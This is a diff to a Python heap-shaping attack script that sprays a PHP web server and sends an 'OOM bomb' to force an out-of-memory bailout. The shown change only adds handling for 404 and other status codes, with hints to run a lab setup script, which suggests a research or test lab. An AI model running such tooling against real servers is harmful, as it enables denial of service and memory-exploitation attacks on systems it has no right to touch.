@@ -435,10 +435,19 @@ def run_heapshape_attack(host, port, path, strategy, spray_count,
         # Phase 1: warm-up
         print("\n[Phase 1] Sending warm-up request to prime worker heap...")
         warmup_resp = send_warmup_request(host, port, path)
-        if warmup_resp and b"200" in warmup_resp.split(b"\r\n", 1)[0]:
-            print("    Warm-up OK")
+        if warmup_resp:
+            warmup_status = warmup_resp.split(b"\r\n", 1)[0]
+            if b"200" in warmup_status:
+                print("    Warm-up OK")
+            elif b"404" in warmup_status:
+                print("    [!] 404 Not Found — target path does not exist")
+                print("        Run lab/setup.sh to generate webroot files")
+                return "DETECTED", "Target path returned 404"
+            else:
+                ws = warmup_status.decode("latin1", "replace")
+                print(f"    Warm-up: {ws} (continuing)")
         else:
-            print("    Warm-up: unexpected response (continuing)")
+            print("    Warm-up: no response (continuing)")
         time.sleep(0.1)
 
         # Phase 2+3: combined spray + OOM bomb
@@ -452,7 +461,12 @@ def run_heapshape_attack(host, port, path, strategy, spray_count,
             print(f"    OOM response: {status}")
             print(f"    Response size: {len(oom_resp)} bytes")
 
-            if b"500" in status.encode():
+            if b"404" in status.encode():
+                print("    [!] 404 Not Found — target path does not exist")
+                print("        Check that the webroot contains index.php")
+                print("        (run lab/setup.sh to generate it)")
+                break
+            elif b"500" in status.encode():
                 print("    [+] Server returned 500 — OOM bailout triggered")
             elif b"200" in status.encode():
                 print("    [-] Server returned 200 — OOM not reached")
